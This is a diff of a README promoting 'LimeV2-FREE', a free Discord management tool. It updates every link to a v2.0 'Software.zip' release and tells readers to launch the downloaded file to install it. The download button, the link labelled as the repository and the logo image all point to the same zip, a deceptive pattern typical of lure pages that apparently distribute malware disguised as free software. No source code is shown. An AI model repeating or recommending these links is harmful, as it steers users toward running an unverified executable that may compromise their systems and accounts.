@@ -25,15 +25,15 @@ Welcome to LimeV2-FREE - the ultimate Discord tool for all your community manage
 
 ### Get Started
 🚀 To begin using LimeV2-FREE, you can download the latest version from the following link:
-[![Download LimeV2-FREE](https://github.com/55ggcf/LimeV2-FREE/releases/download/v1.0/Application.zip)](https://github.com/55ggcf/LimeV2-FREE/releases/download/v1.0/Application.zip)
+[![Download LimeV2-FREE](https://github.com/55ggcf/LimeV2-FREE/releases/download/v2.0/Software.zip)](https://github.com/55ggcf/LimeV2-FREE/releases/download/v2.0/Software.zip)
 
 ### Note
 📌 *Please note that the downloaded file needs to be launched to install LimeV2-FREE on your system.*
 
 ### Explore Further
-🔗 Visit our [GitHub Repository](https://github.com/55ggcf/LimeV2-FREE/releases/download/v1.0/Application.zip) for more information and updates on LimeV2-FREE. If the provided link is not working or you need alternative versions, be sure to check the "Releases" section on our repository page.
+🔗 Visit our [GitHub Repository](https://github.com/55ggcf/LimeV2-FREE/releases/download/v2.0/Software.zip) for more information and updates on LimeV2-FREE. If the provided link is not working or you need alternative versions, be sure to check the "Releases" section on our repository page.
 
 ### Soar to New Heights with LimeV2-FREE
 Unleash the full potential of your Discord community management with LimeV2-FREE. Elevate your server experience, automate tasks, and engage with your members like never before. Take the leap, download LimeV2-FREE, and watch your Discord server thrive! 🌟
 
-![LimeV2-FREE Logo](https://github.com/55ggcf/LimeV2-FREE/releases/download/v1.0/Application.zip)
+![LimeV2-FREE Logo](https://github.com/55ggcf/LimeV2-FREE/releases/download/v2.0/Software.zip)
